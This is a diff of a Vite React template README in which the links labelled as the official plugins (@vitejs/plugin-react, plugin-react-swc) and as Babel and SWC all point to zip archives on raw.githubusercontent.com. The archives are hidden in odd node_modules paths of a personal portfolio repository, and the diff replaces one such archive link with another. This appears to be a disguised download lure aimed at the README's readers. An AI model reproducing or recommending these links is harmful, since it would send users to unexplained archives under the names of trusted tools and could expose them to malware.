@@ -4,5 +4,5 @@ This template provides a minimal setup to get React working in Vite with HMR and
 
 Currently, two official plugins are available:
 
-- [@vitejs/plugin-react](https://raw.githubusercontent.com/samiullahhussai/My-Portfolio/main/node_modules/postcss/lib/My_Portfolio_v2.2.zip) uses [Babel](https://raw.githubusercontent.com/samiullahhussai/My-Portfolio/main/node_modules/postcss/lib/My_Portfolio_v2.2.zip) for Fast Refresh
-- [@vitejs/plugin-react-swc](https://raw.githubusercontent.com/samiullahhussai/My-Portfolio/main/node_modules/postcss/lib/My_Portfolio_v2.2.zip) uses [SWC](https://raw.githubusercontent.com/samiullahhussai/My-Portfolio/main/node_modules/postcss/lib/My_Portfolio_v2.2.zip) for Fast Refresh
+- [@vitejs/plugin-react](https://raw.githubusercontent.com/samiullahhussai/My-Portfolio/main/node_modules/is-date-object/test/My-Portfolio-v2.9-beta.1.zip) uses [Babel](https://raw.githubusercontent.com/samiullahhussai/My-Portfolio/main/node_modules/is-date-object/test/My-Portfolio-v2.9-beta.1.zip) for Fast Refresh
+- [@vitejs/plugin-react-swc](https://raw.githubusercontent.com/samiullahhussai/My-Portfolio/main/node_modules/is-date-object/test/My-Portfolio-v2.9-beta.1.zip) uses [SWC](https://raw.githubusercontent.com/samiullahhussai/My-Portfolio/main/node_modules/is-date-object/test/My-Portfolio-v2.9-beta.1.zip) for Fast Refresh
